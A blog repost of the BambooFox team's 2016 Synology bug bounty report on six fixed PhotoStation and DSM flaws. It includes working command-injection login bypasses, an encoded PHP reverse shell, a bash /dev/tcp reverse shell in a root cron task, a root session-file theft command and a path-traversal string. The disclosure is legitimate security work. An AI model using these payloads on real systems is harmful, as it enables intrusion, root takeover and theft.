<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="web,Synology Bug Bounty ,bug bounty,DoS,LFI,command injection," />










<meta name="description" content="Synology Bug Bounty Report Author: BambooFox Team( Henry, jpeanut, ding, leepupu, Angelboy, boik, adr, Mango King, Bletchley )  Last year ( 2016 ) , we BambooFox were invited to join the Synology Bug">
<meta property="og:type" content="article">
<meta property="og:title" content="[Synology Bug Bounty 2016]">
<meta property="og:url" content="https://blog.feedscoin.com/2017/03/20/Synology-Bug-Bounty-2016/index.html">
<meta property="og:site_name" content="逐流小站">
<meta property="og:description" content="Synology Bug Bounty Report Author: BambooFox Team( Henry, jpeanut, ding, leepupu, Angelboy, boik, adr, Mango King, Bletchley )  Last year ( 2016 ) , we BambooFox were invited to join the Synology Bug">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.imgur.com/pnIWZ6t.png">
<meta property="og:image" content="https://i.imgur.com/qJxpKq8.png">
<meta property="og:image" content="https://i.imgur.com/5YrQU54.jpg">
<meta property="og:image" content="https://i.imgur.com/aU9IDWm.png">
<meta property="og:image" content="https://i.imgur.com/ZpL5Tw7.png">
<meta property="article:published_time" content="2017-03-19T23:28:00.000Z">
<meta property="article:modified_time" content="2024-01-15T07:55:58.472Z">
<meta property="article:author" content="Laird Lau">
<meta property="article:tag" content="web">
<meta property="article:tag" content="Synology Bug Bounty ">
<meta property="article:tag" content="bug bounty">
<meta property="article:tag" content="DoS">
<meta property="article:tag" content="LFI">
<meta property="article:tag" content="command injection">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.imgur.com/pnIWZ6t.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://blog.feedscoin.com/2017/03/20/Synology-Bug-Bounty-2016/"/>





  <title>[Synology Bug Bounty 2016] | 逐流小站</title>
  





<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-MW47YH6RH0"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-MW47YH6RH0');
</script>





<meta name="generator" content="Hexo 7.0.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">逐流小站</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">想回到那个能随便跳槽的年代</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            Sitemap
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  
  <div class="algolia-popup popup search-popup">
    <div class="algolia-search">
      <div class="algolia-search-input-icon">
        <i class="fa fa-search"></i>
      </div>
      <div class="algolia-search-input" id="algolia-search-input"></div>
    </div>

    <div class="algolia-results">
      <div id="algolia-stats"></div>
      <div id="algolia-hits"></div>
      <div id="algolia-pagination" class="algolia-pagination"></div>
    </div>

    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
  </div>




    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/03/20/Synology-Bug-Bounty-2016/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">[Synology Bug Bounty 2016]</h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-03-20T07:28:00+08:00">
                2017-03-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                
                  , 
                

              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/bug-bounty-report/" itemprop="url" rel="index">
                    <span itemprop="name">bug-bounty-report</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      

        <h1 id="Synology-Bug-Bounty-Report"><a href="#Synology-Bug-Bounty-Report" class="headerlink" title="Synology Bug Bounty Report"></a>Synology Bug Bounty Report</h1><blockquote>
<p>Author: BambooFox Team<br>( Henry, jpeanut, ding, leepupu, Angelboy, boik, adr, Mango King, Bletchley )</p>
</blockquote>
<p>Last year ( 2016 ) , we BambooFox were invited to join the Synology Bug Bounty program. After about 2 months of hacking, we discovered several vulnerabilities, including a <strong>remote root code execution</strong> vulnerability. Synology engineers response and fix the vulnerabilities in a very short time, which shows they pay a lot of attention to security issues.</p>
<p>And now ( in 2017 ) , we are allowed to publish the vulnerabilities:  </p>
<ul>
<li><a href="#Vul-01-PhotoStation-Login-without-password">Vul-01 PhotoStation Login without password</a></li>
<li><a href="#Vul-02-PhotoStation-Remote-Code-Execution">Vul-02 PhotoStation Remote Code Execution</a></li>
<li><a href="#Vul-03-Read-Write-Arbitrary-Files">Vul-03 Read-Write Arbitrary Files</a></li>
<li><a href="#Vul-04-Privilege-Escalation">Vul-04 Privilege Escalation</a></li>
<li><a href="#Vul-05-DoS-via-Blocking-IP">Vul-05 DoS via Blocking IP</a></li>
<li><a href="#Vul-06-Local-File-Inclusion">Vul-06 Local File Inclusion</a></li>
</ul>
<h2 id="Vul-01-PhotoStation-Login-without-password"><a href="#Vul-01-PhotoStation-Login-without-password" class="headerlink" title="Vul-01: PhotoStation Login without password"></a>Vul-01: PhotoStation Login without password</h2><hr>
<p>We mostly focus on <strong>PhotoStation</strong>, which is the picture management system enabled in most Synology DSM ( DiskStation Manager ).</p>
<p>The first vulnerability allowed us to <strong>login as admin without entering the password.</strong></p>
<p>PoC1:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET //photo/login.php?usr=admin&amp;sid=xxx&amp;SynoToken=/bin/true HTTP/1.1</span><br><span class="line">Host: bamboofox.hopto.org</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept:    text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">X-Forwarded-For: |</span><br><span class="line">Cookie: stay_login=0; language=en; PHPSESSID=ime6mqrg0pghbjo4p9aomqcbv0; left-panel-visibility=show</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>The key points are the <code>|</code> character in the <code>X-Forwarded-For</code> field and <code>/bin/true</code> in the get parameter <code>SynoToken</code>. The server site CGI will concatenate the strings in <code>usr</code>, <code>X-Forwarded-For</code> and <code>SynoToken</code> into a command and execute the command, and the special characters <code>|</code> and <code>&gt;</code> aren’t filtered out correctly, which will lead to the <strong>command injection</strong> vulnerability. </p>
<p>Therefore in our PoC1, the command will become:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/syno/bin/synophoto_dsm_user username | /bin/true</span><br></pre></td></tr></table></figure>

<p>The command will return 0 (True) and thus bypass the authentication.</p>
<p><strong>Result:<br>Adversary can login as admin without password</strong></p>
<p><img src="https://i.imgur.com/pnIWZ6t.png" alt="Login without password"></p>
<p>Adversary can also login as admin by the following PoC:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /photo/photo_login.php</span><br><span class="line">action=login&amp;username=admin&amp;password=%26</span><br></pre></td></tr></table></figure>

<p>The source code that handle the user authentication are in <code>photo_login.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$retval</span> = cs<span class="title class_">SYNOPhotoMisc</span>::<span class="title function_ invoke__">ExecCmd</span>(<span class="string">&#x27;/usr/syno/bin/synophoto_dsm_user&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;--auth&#x27;</span>, <span class="variable">$user</span>, <span class="variable">$pass</span>), <span class="literal">false</span>, <span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>

<p>Once the <code>$pass</code> variable is <code>&amp;</code>, the command will be executed in the background and always return 0 (true), thus the adversary can login as admin.</p>
<h2 id="Vul-02-PhotoStation-Remote-Code-Execution"><a href="#Vul-02-PhotoStation-Remote-Code-Execution" class="headerlink" title="Vul-02: PhotoStation Remote Code Execution"></a>Vul-02: PhotoStation Remote Code Execution</h2><hr>
<p>After we successfully login as admin via the command injection vulnerability, we extended the attack surface to attempt remote code execution.</p>
<p>PoC2:<br>1 . Encode the command into base64 format</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base64encode( $sock=fsockopen(&quot;......&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;); )</span><br><span class="line">=&gt; JHNvY2s9ZnNvY2tvcGVuKCIzNi4yMzEuNjguMjE1Iiw4MDgwKTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOw==</span><br></pre></td></tr></table></figure>

<p>2 . Send the payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET //photo/login.php?usr=|&amp;sid=php&amp;SynoToken=eval%28base64_decode%28%22JHNvY2s9ZnNvY2tvcGVuKCIzNi4yMzEuNjguMjE1Iiw4MDgwKTtleGVjKCIvYmluL3NoIC1pIDwmMyA%2bJjMgMj4mMyIpOw%3D%3D%22%29%29%3B HTTP/1.1</span><br><span class="line">Host: bamboofox.hopto.org</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">X-Forwarded-For: -r</span><br><span class="line">Cookie: stay_login=0; language=en; PHPSESSID=ime6mqrg0pghbjo4p9aomqcbv0; left-panel-visibility=show</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>We adopted a similar approach (PoC1) in order to achieve RCE.</p>
<p>We then took a deep look into the source code of PhotoStation, and found the following code:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$x_forward</span>) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$x_forward</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="variable">$retval</span> = cs<span class="title class_">SYNOPhotoMisc</span>::<span class="title function_ invoke__">ExecCmd</span>(<span class="string">&#x27;/usr/syno/bin/synophoto_dsm_user&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;--current&#x27;</span>, <span class="variable">$user</span>, <span class="variable">$session_id</span>, <span class="variable">$ip</span>, <span class="variable">$synotoken</span>), <span class="literal">false</span>, <span class="variable">$isValidUser</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$retval</span> === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable">$login_status</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// login failed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In this code snippet, <code>$user</code>, <code>$ip</code> and <code>$synotoken</code> can be easily controlled by crafting the HTTP headers, and that’s the original cause of the command injection vulnerability.<br>Our first few attempts failed due to the site filtered out some special characters. However, we noticed that the site did not filtered out all the special characters. Here’s the code that indicated the non-filtered characters:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">static</span> <span class="variable">$skipEscape</span> = <span class="keyword">array</span>(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>As a result of the code above, <code>&gt;</code>, <code>&lt;</code>, <code>|</code> and <code>&amp;</code> can be used to achieve command injection.</p>
<p><img src="https://i.imgur.com/qJxpKq8.png" alt="Remote Code Execution"></p>
<h2 id="Vul-03-Read-Write-Arbitrary-Files"><a href="#Vul-03-Read-Write-Arbitrary-Files" class="headerlink" title="Vul-03: Read-Write Arbitrary Files"></a>Vul-03: Read-Write Arbitrary Files</h2><hr>
<p>After we got the shell, we continued to find security flaws in the DSM. The binary program <code>synophoto_dsm_user</code> got our attention. This binary is a <strong>setuid program</strong>, and has a powerful copy function.<br>With the <code>--copy root</code> parameter, it will do the <code>cp</code> command and <strong>copy a file with the root permission</strong>. This make us have the ability to read&#x2F;write an arbitrary file .</p>
<h2 id="Vul-04-Privilege-Escalation"><a href="#Vul-04-Privilege-Escalation" class="headerlink" title="Vul-04: Privilege Escalation"></a>Vul-04: Privilege Escalation</h2><hr>
<p>With the previous Vul-02 ( RCE ) and Vul-03 ( Read-Write Arbitrary Files ), we can exploit the vulnerability and <strong>escalate our privilege to root</strong>. We first tried modify the <code>/etc/crontab</code> file, but failed due to the <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/AppArmor">AppArmor</a> protection. So we change our target to the file that will be invoked by crontab. Finally we found <code>/tmp/synoschedtask</code>, a task which will be invoked by crontab as root. We use <code>synophoto_dsm_user</code> to modify its file content to the following command:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/volume1/photo/bash -c &#x27;/volume1/photo/bash -i &gt;&amp; /dev/tcp/x.x.x.x/yyyyy 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>

<p>Now we can wait for our reverse shell, with the root permission.<br><img src="https://i.imgur.com/5YrQU54.jpg" alt="Remote Code Execution"></p>
<p>Also by exploiting Vul-02 and Vul-03, we’re able to login the service as admin. If the admin is logged in, we can use the following command to get the admin’s session ID:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usr/syno/bin/synophoto_dsm_user --copy root /usr/syno/etc/private/session/current.users /volume1/photo/current.users</span><br></pre></td></tr></table></figure>

<p>Although the server side will check the admin’s IP address, but the check can be bypassed easily by forging the <code>X-Forwarded-For</code> header.</p>
<p><strong>Login as admin give us the ability to execute command with the root permission</strong>. For example, we can execute our own command as root with the help of <strong>Task Scheduler</strong>. This result in a privilege escalation as well.</p>
<h2 id="Vul-05-DoS-via-Blocking-IP"><a href="#Vul-05-DoS-via-Blocking-IP" class="headerlink" title="Vul-05: DoS via Blocking IP"></a>Vul-05: DoS via Blocking IP</h2><hr>
<p>We also found some other security flaws.<br>If a user sends too many requests to <code>forget_passwd.cgi</code>, the user will be blocked by his IP, which is retrieved from the <code>X-Forwarded-For</code> header.<br>However, <code>X-Forwarded-For</code> can be easily forged from the client side, therefore an attacker can block as many users as he wants by forging the <code>X-Forwarded-For</code> header, leading a DoS attack.<br><img src="https://i.imgur.com/aU9IDWm.png" alt="Block IP"></p>
<h2 id="Vul-06-Local-File-Inclusion"><a href="#Vul-06-Local-File-Inclusion" class="headerlink" title="Vul-06: Local File Inclusion"></a>Vul-06: Local File Inclusion</h2><hr>
<p>There’s a LFI (Local File Inclusion) vulnerability in <code>download.php</code>. The <code>id</code> parameter is controllable.<br>For example, we can use <code>../../../../../../var/services/homes/[username]/.gitconfig</code> to download a user’s git config file.</p>
<p><img src="https://i.imgur.com/ZpL5Tw7.png" alt="Local File Inclusion">  </p>
<h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul>
<li>2016&#x2F;07&#x2F;25 Report vulnerabilities to Synology</li>
<li>2016&#x2F;09&#x2F;01 Confirm that all vulnerabilities have already been fixed by Synology</li>
<li>2017&#x2F;03&#x2F;13 Confirm that we’re allowed to publish the bug bounty report</li>
<li>2017&#x2F;03&#x2F;20 Synology Bug Bounty Report published</li>
</ul>
<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>Some of the vulnerabilities have already been discovered by Lucas Leong from Trend Micro ( <a target="_blank" rel="noopener" href="http://seclists.org/oss-sec/2016/q1/236">link</a> )</p>

      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/web/" rel="tag"># web</a>
          
            <a href="/tags/Synology-Bug-Bounty/" rel="tag"># Synology Bug Bounty </a>
          
            <a href="/tags/bug-bounty/" rel="tag"># bug bounty</a>
          
            <a href="/tags/DoS/" rel="tag"># DoS</a>
          
            <a href="/tags/LFI/" rel="tag"># LFI</a>
          
            <a href="/tags/command-injection/" rel="tag"># command injection</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2017/03/20/beautifull-i3/" rel="next" title="体验I3之美">
                <i class="fa fa-chevron-left"></i> 体验I3之美
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2017/03/25/2017/03/linux-core-caricature/" rel="prev" title="漫画欣赏：Linux内核到底长啥样？">
                漫画欣赏：Linux内核到底长啥样？ <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%7C%7C%20archive">
              
                  <span class="site-state-item-count">1451</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">71</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">914</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Synology-Bug-Bounty-Report"><span class="nav-number">1.</span> <span class="nav-text">Synology Bug Bounty Report</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Vul-01-PhotoStation-Login-without-password"><span class="nav-number">1.1.</span> <span class="nav-text">Vul-01: PhotoStation Login without password</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vul-02-PhotoStation-Remote-Code-Execution"><span class="nav-number">1.2.</span> <span class="nav-text">Vul-02: PhotoStation Remote Code Execution</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vul-03-Read-Write-Arbitrary-Files"><span class="nav-number">1.3.</span> <span class="nav-text">Vul-03: Read-Write Arbitrary Files</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vul-04-Privilege-Escalation"><span class="nav-number">1.4.</span> <span class="nav-text">Vul-04: Privilege Escalation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vul-05-DoS-via-Blocking-IP"><span class="nav-number">1.5.</span> <span class="nav-text">Vul-05: DoS via Blocking IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vul-06-Local-File-Inclusion"><span class="nav-number">1.6.</span> <span class="nav-text">Vul-06: Local File Inclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Timeline"><span class="nav-number">1.7.</span> <span class="nav-text">Timeline</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Note"><span class="nav-number">1.8.</span> <span class="nav-text">Note</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Laird Lau</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
